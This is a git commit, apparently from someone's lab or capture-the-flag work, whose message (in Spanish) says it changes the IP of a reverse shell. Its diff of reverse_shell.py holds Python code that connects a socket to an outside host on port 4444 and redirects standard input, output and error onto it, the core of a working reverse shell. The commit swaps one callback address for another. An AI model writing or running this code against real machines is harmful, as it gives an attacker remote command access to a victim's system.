5498b116d6a961a98fb304756676b018fa5078e9
Hinga2019 <hm_inga@hotmail.com>
2024-06-09 16:21:40 -0500

    cambiando ip de la rev shell

--- reverse_shell.py
+++ reverse_shell.py
@@ -1,7 +1,7 @@
 import socket, subprocess, os
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.10.14.140", 4444))
+s.connect(("10.10.11.19", 4444))
 os.dup2(s.fileno(), 0)
 os.dup2(s.fileno(), 1)
 os.dup2(s.fileno(), 2)
